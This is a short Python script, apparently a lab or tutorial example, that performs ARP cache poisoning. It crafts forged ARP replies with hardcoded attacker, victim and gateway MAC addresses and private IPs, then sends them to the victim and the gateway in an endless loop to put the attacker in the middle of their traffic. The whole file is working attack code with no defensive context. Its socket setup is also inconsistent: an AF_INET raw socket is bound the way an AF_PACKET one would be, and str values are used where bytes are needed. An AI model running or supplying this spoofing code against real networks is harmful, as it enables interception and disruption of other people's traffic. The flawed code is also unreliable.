import socket

def ARPstart():
    # create the socket with IP protocol parameter 0x0800
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket. htons(0x0800))
    s.bind(("eth0",socket.htons(0x0800)))

    # MAC of attacker, victim and gateway machine
    attckrmac = '\x00\x0c\x29\x4f\x8e\x76'
    victimmac ='\x00\x0C\x29\x2E\x84\x5A'
    gatewaymac = '\x00\x50\x56\xC0\x00\x28'

    # ARP protocol code
    ARPcode ='\x08\x06'

    # eth packets crafting
    # victim
    ethernet1 = victimmac + attckrmac + ARPcode
    # gateway
    ethernet2 = gatewaymac + attckrmac + ARPcode

    # ARP header setting
    htype = '\x00\x01'
    protype = '\x08\x00'
    hsize = '\x06'
    psize = '\x04'
    opcode = '\x00\x02'

    # customized IPs of gateway machine and victim and converting to hexa code
    gateway_ip = socket.inet_aton('192.168.1.3')
    victim_ip = socket.inet_aton('192.168.1.5')

    # the main step which is replacing the gateway machine's IP
    victim_ARP = ethernet1 + htype + protype + hsize + psize + opcode + attckrmac + gateway_ip + victimmac + victim_ip
    gateway_ARP = ethernet2 + htype + protype + hsize + psize +opcode + attckrmac + victim_ip + gatewaymac + gateway_ip

    while 1:
       s.send(victim_ARP)
       s.send(gateway_ARP)
